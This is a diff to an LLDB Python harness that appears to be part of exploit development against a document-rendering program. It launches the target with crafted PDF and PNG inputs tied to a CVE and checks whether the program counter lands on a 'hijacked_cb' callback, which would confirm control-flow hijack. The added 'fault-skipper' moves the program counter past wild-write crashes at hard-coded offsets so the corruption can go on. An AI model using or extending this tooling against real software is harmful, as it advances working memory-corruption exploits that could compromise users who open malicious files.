@@ -93,7 +93,7 @@ b_m2 = t.BreakpointCreateByName("marker2")
 b_m3 = t.BreakpointCreateByName("marker3")
 b_fin = t.BreakpointCreateByName("data_release_info")
 b_st = t.BreakpointCreateByName("aa_cache_render"); b_st.SetOneShot(True)
-p = t.LaunchSimple(["k2_s1000.pdf", "r.png", "k2_d31472.pdf"], None, CVE)
+p = t.LaunchSimple(["k2_s1000.pdf", "r.png", "k2_d31472.pdf", "k2_s1000.pdf"], None, CVE)
 R = None; CB = None; TGT = None; stores = 0; patched = 0; result = "incomplete"
 if p and p.IsValid():
     th = p.GetSelectedThread()
@@ -153,16 +153,30 @@ if p and p.IsValid():
             p.Continue()
         else:
             pc = safe_pc_addr(fr) or 0
-            if CB and (pc == CB):
-                T("!!! PC==rel_cb at stop off=%d !!!" % off)
-                result = "PC-CONTROL-CONFIRMED pc=rel_cb"
+            if TGT and pc == TGT:
+                T("!!! PC==hijacked_cb at stop off=%d !!!" % off)
+                result = "PC-CONTROL-CONFIRMED pc=hijacked_cb"
                 p.Continue()
                 continue
             desc = p.GetSelectedThread().GetStopDescription(300) or ""
-            if "EXC_BAD_ACCESS" in desc and CB and pc == CB:
-                result = "PC-CONTROL-CONFIRMED fault-pc=rel_cb"
-                T(result); killp(p); break
-            p.Continue()
+            if "EXC_BAD_ACCESS" in desc:
+                # fault-skipper: wild-write site faults -> skip the store, keep decode alive
+                skipped = False
+                if fr.GetSymbol() and pc:
+                    try:
+                        soff = pc - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
+                        if soff in (1868, 2476, 2540, 2644):
+                            pcr = fr.FindRegister("pc")
+                            pcr.SetValueFromCString("0x%x" % (pc + 4))
+                            skipped = True
+                            T("skip fault at +%d -> pc+4" % soff)
+                    except Exception:
+                        pass
+                if not skipped and ("faults" not in dir()):
+                    pass
+                p.Continue()
+            else:
+                p.Continue()
     killp(p)
 for b in (b_m2, b_m3, b_fin, b_st, b_w):
     if b: t.BreakpointDelete(b.GetID())
